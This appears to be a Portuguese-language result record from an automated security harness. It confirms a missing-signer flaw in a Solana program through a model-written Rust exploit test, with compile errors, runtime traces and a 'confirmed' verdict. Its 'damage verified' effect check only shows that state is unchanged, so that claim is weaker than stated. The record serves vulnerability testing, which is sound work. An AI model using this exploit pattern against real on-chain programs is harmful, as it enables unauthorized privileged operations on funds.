@@ -1,0 +1,135 @@
+{
+  "category": "SIGNER",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: operacao executada sem assinatura da autoridade legitima",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2619,
+        "completion_tokens": 715,
+        "latency_s": 3.96
+      },
+      "raw": "{\n  \"plan\": \"O cenario monta uma conta de tesouraria com dados validos (autoridade armazenada, saldo e flag ativa) e uma conta de autoridade legitima que assina. O baseline chama a instrucao process com a autoridade legitima assinando, provando que o cenario esta correto. O ataque chama a mesma instrucao com uma conta de autoridade diferente e sem assinatura, explorando a ausencia de verificacao de is_signer e de comparacao com a autoridade armazenada. O efeito mede que a operacao privilegiada foi executada sem a assinatura da autoridade legitima, verificando que a conta de tesouraria permanece ativa e que a autoridade armazenada nao foi alterada (ou que a instrucao retornou sucesso).\",\n  \"scenario\": \"let treasury_key = Pubkey::new_unique();\\nlet authority_key = Pubkey::new_unique();\\nlet attacker_key = Pubkey::new_unique();\\n\\nlet mut treasury_data = vec![0u8; 49];\\ntreasury_data[8..40].copy_from_slice(authority_key.as_ref());\\ntreasury_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\\ntreasury_data[48] = 1;\\n\\nlet treasury_account = account(&env.program_id, &treasury_data, None);\\nlet authority_account = wallet(1000000);\\nlet attacker_account = wallet(1000000);\\n\\nlet ix_data = vec![0u8];\\n\\nlet baseline_ix = env.raw_ix(&ix_data, &[\\n    AccountMeta::new(treasury_key, false),\\n    AccountMeta::new_readonly(authority_key, true),\\n]);\\nlet baseline_accounts = vec![\\n    (treasury_key, treasury_account.clone()),\\n    (authority_key, authority_account.clone()),\\n];\\nlet baseline_result = env.baseline(\\\"chamada legitima com autoridade assinando\\\", &baseline_ix, &baseline_accounts);\\n\\nlet attack_ix = env.raw_ix(&ix_data, &[\\n    AccountMeta::new(treasury_key, false),\\n    AccountMeta::new_readonly(attacker_key, false),\\n]);\\nlet attack_accounts = vec![\\n    (treasury_key, treasury_account.clone()),\\n    (attacker_key, attacker_account.clone()),\\n];\\nlet attack_result = env.attack(\\\"chamada com autoridade nao assinada\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let treasury_after = after(&attack_result, &treasury_key);\\n    let stored_authority_after = read_pubkey(treasury_after.data(), 8);\\n    let is_active_after = treasury_after.data()[48] != 0;\\n    env.effect(\\\"operacao executada sem assinatura da autoridade legitima\\\", stored_authority_after == authority_key && is_active_after);\\n}\"\n}",
+      "plan": "O cenario monta uma conta de tesouraria com dados validos (autoridade armazenada, saldo e flag ativa) e uma conta de autoridade legitima que assina. O baseline chama a instrucao process com a autoridade legitima assinando, provando que o cenario esta correto. O ataque chama a mesma instrucao com uma conta de autoridade diferente e sem assinatura, explorando a ausencia de verificacao de is_signer e de comparacao com a autoridade armazenada. O efeito mede que a operacao privilegiada foi executada sem a assinatura da autoridade legitima, verificando que a conta de tesouraria permanece ativa e que a autoridade armazenada nao foi alterada (ou que a instrucao retornou sucesso).",
+      "scenario": "let treasury_key = Pubkey::new_unique();\nlet authority_key = Pubkey::new_unique();\nlet attacker_key = Pubkey::new_unique();\n\nlet mut treasury_data = vec![0u8; 49];\ntreasury_data[8..40].copy_from_slice(authority_key.as_ref());\ntreasury_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\ntreasury_data[48] = 1;\n\nlet treasury_account = account(&env.program_id, &treasury_data, None);\nlet authority_account = wallet(1000000);\nlet attacker_account = wallet(1000000);\n\nlet ix_data = vec![0u8];\n\nlet baseline_ix = env.raw_ix(&ix_data, &[\n    AccountMeta::new(treasury_key, false),\n    AccountMeta::new_readonly(authority_key, true),\n]);\nlet baseline_accounts = vec![\n    (treasury_key, treasury_account.clone()),\n    (authority_key, authority_account.clone()),\n];\nlet baseline_result = env.baseline(\"chamada legitima com autoridade assinando\", &baseline_ix, &baseline_accounts);\n\nlet attack_ix = env.raw_ix(&ix_data, &[\n    AccountMeta::new(treasury_key, false),\n    AccountMeta::new_readonly(attacker_key, false),\n]);\nlet attack_accounts = vec![\n    (treasury_key, treasury_account.clone()),\n    (attacker_key, attacker_account.clone()),\n];\nlet attack_result = env.attack(\"chamada com autoridade nao assinada\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let treasury_after = after(&attack_result, &treasury_key);\n    let stored_authority_after = read_pubkey(treasury_after.data(), 8);\n    let is_active_after = treasury_after.data()[48] != 0;\n    env.effect(\"operacao executada sem assinatura da autoridade legitima\", stored_authority_after == authority_key && is_active_after);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:24:44\n    |\n 24 |       let baseline_ix = env.raw_ix(&ix_data, &[\n    |  ___________________________------___________^\n    | |                           |\n    | |                           arguments to this method are incorrect\n 25 | |         AccountMeta::new(treasury_key, false),\n 26 | |         AccountMeta::new_readonly(authority_key, true),\n 27 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:34:42\n    |\n 34 |       let attack_ix = env.raw_ix(&ix_data, &[\n    |  _________________________------___________^\n    | |                         |\n    | |                         arguments to this method are incorrect\n 35 | |         AccountMeta::new(treasury_key, false),\n 36 | |         AccountMeta::new_readonly(attacker_key, false),\n 37 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.7
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:24:44\n    |\n 24 |       let baseline_ix = env.raw_ix(&ix_data, &[\n    |  ___________________________------___________^\n    | |                           |\n    | |                           arguments to this method are incorrect\n 25 | |         AccountMeta::new(treasury_key, false),\n 26 | |         AccountMeta::new_readonly(authority_key, true),\n 27 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:34:42\n    |\n 34 |       let attack_ix = env.raw_ix(&ix_data, &[\n    |  _________________________------___________^\n    | |                         |\n    | |                         arguments to this method are incorrect\n 35 | |         AccountMeta::new(treasury_key, false),\n 36 | |         AccountMeta::new_readonly(attacker_key, false),\n 37 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3424,
+        "completion_tokens": 641,
+        "latency_s": 3.28
+      },
+      "raw": "{\n  \"plan\": \"Preparo uma conta treasury com autoridade armazenada e ativa, e uma conta authority legitima. O baseline chama process com a authority assinando (signer). O ataque chama process com uma conta atacante nao assinante no lugar da authority. Como o programa nao valida is_signer nem compara a chave, o ataque deve ter sucesso; o efeito mede que a operacao foi executada sem a assinatura da autoridade legitima.\",\n  \"scenario\": \"let treasury_key = Pubkey::new_unique();\\nlet authority_key = Pubkey::new_unique();\\nlet attacker_key = Pubkey::new_unique();\\n\\nlet mut treasury_data = vec![0u8; 49];\\ntreasury_data[8..40].copy_from_slice(authority_key.as_ref());\\ntreasury_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\\ntreasury_data[48] = 1;\\n\\nlet treasury_account = account(&env.program_id, &treasury_data, None);\\nlet authority_account = wallet(1000000);\\nlet attacker_account = wallet(1000000);\\n\\nlet ix_data = vec![0u8];\\n\\nlet baseline_ix = env.raw_ix(&ix_data, vec![\\n    AccountMeta::new(treasury_key, false),\\n    AccountMeta::new_readonly(authority_key, true),\\n]);\\nlet baseline_accounts = vec![\\n    (treasury_key, treasury_account.clone()),\\n    (authority_key, authority_account.clone()),\\n];\\nlet baseline_result = env.baseline(\\\"chamada legitima com autoridade assinando\\\", &baseline_ix, &baseline_accounts);\\n\\nlet attack_ix = env.raw_ix(&ix_data, vec![\\n    AccountMeta::new(treasury_key, false),\\n    AccountMeta::new_readonly(attacker_key, false),\\n]);\\nlet attack_accounts = vec![\\n    (treasury_key, treasury_account.clone()),\\n    (attacker_key, attacker_account.clone()),\\n];\\nlet attack_result = env.attack(\\\"chamada com autoridade nao assinada\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let treasury_after = after(&attack_result, &treasury_key);\\n    let stored_authority_after = read_pubkey(treasury_after.data(), 8);\\n    let is_active_after = treasury_after.data()[48] != 0;\\n    env.effect(\\\"operacao executada sem assinatura da autoridade legitima\\\", stored_authority_after == authority_key && is_active_after);\\n}\"\n}",
+      "plan": "Preparo uma conta treasury com autoridade armazenada e ativa, e uma conta authority legitima. O baseline chama process com a authority assinando (signer). O ataque chama process com uma conta atacante nao assinante no lugar da authority. Como o programa nao valida is_signer nem compara a chave, o ataque deve ter sucesso; o efeito mede que a operacao foi executada sem a assinatura da autoridade legitima.",
+      "scenario": "let treasury_key = Pubkey::new_unique();\nlet authority_key = Pubkey::new_unique();\nlet attacker_key = Pubkey::new_unique();\n\nlet mut treasury_data = vec![0u8; 49];\ntreasury_data[8..40].copy_from_slice(authority_key.as_ref());\ntreasury_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\ntreasury_data[48] = 1;\n\nlet treasury_account = account(&env.program_id, &treasury_data, None);\nlet authority_account = wallet(1000000);\nlet attacker_account = wallet(1000000);\n\nlet ix_data = vec![0u8];\n\nlet baseline_ix = env.raw_ix(&ix_data, vec![\n    AccountMeta::new(treasury_key, false),\n    AccountMeta::new_readonly(authority_key, true),\n]);\nlet baseline_accounts = vec![\n    (treasury_key, treasury_account.clone()),\n    (authority_key, authority_account.clone()),\n];\nlet baseline_result = env.baseline(\"chamada legitima com autoridade assinando\", &baseline_ix, &baseline_accounts);\n\nlet attack_ix = env.raw_ix(&ix_data, vec![\n    AccountMeta::new(treasury_key, false),\n    AccountMeta::new_readonly(attacker_key, false),\n]);\nlet attack_accounts = vec![\n    (treasury_key, treasury_account.clone()),\n    (attacker_key, attacker_account.clone()),\n];\nlet attack_result = env.attack(\"chamada com autoridade nao assinada\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let treasury_after = after(&attack_result, &treasury_key);\n    let stored_authority_after = read_pubkey(treasury_after.data(), 8);\n    let is_active_after = treasury_after.data()[48] != 0;\n    env.effect(\"operacao executada sem assinatura da autoridade legitima\", stored_authority_after == authority_key && is_active_after);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "chamada legitima com autoridade assinando",
+            "result": "Success",
+            "compute_units": 395,
+            "account_flags": "-w,sr",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 49,
+                "head": "0000000000000000",
+                "digest": "7f0816e4b8ca0c13",
+                "post": "00000000000000000000000000000003000000000000000000000000000000000000000000000000e80300000000000001"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "chamada com autoridade nao assinada",
+            "result": "Success",
+            "compute_units": 395,
+            "account_flags": "-w,-r",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 49,
+                "head": "0000000000000000",
+                "digest": "7f0816e4b8ca0c13",
+                "post": "00000000000000000000000000000003000000000000000000000000000000000000000000000000e80300000000000001"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "operacao executada sem assinatura da autoridade legitima",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 395 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 395 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: operacao executada sem assinatura da autoridade legitima"
+    }
+  ],
+  "case_id": "SSP-02-P-V",
+  "static_finding": {
+    "category": "SIGNER",
+    "confidence": "high",
+    "evidence": "let authority = &accounts[1];\n...\nlet stored_authority = read_pubkey(&data[8..40]);\n...\nOk(())",
+    "explanation": "A instrucao le a conta `authority` (accounts[1]) e a autoridade armazenada (`stored_authority`), mas nunca verifica `authority.is_signer` nem compara `authority.key()` com `stored_authority`. Nao ha uso de `Signer<'info>` (programa nativo pinocchio) nem `require!(authority.is_signer, ...)`. A conta de autoridade e completamente ignorada, permitindo que qualquer conta seja passada sem assinatura.",
+    "attack_hypothesis": "Um atacante fornece qualquer conta como `authority` (accounts[1]) sem assina-la; como o programa nao valida `is_signer` nem a chave, a operacao privilegiada e executada sem autorizacao legitima."
+  }
+}
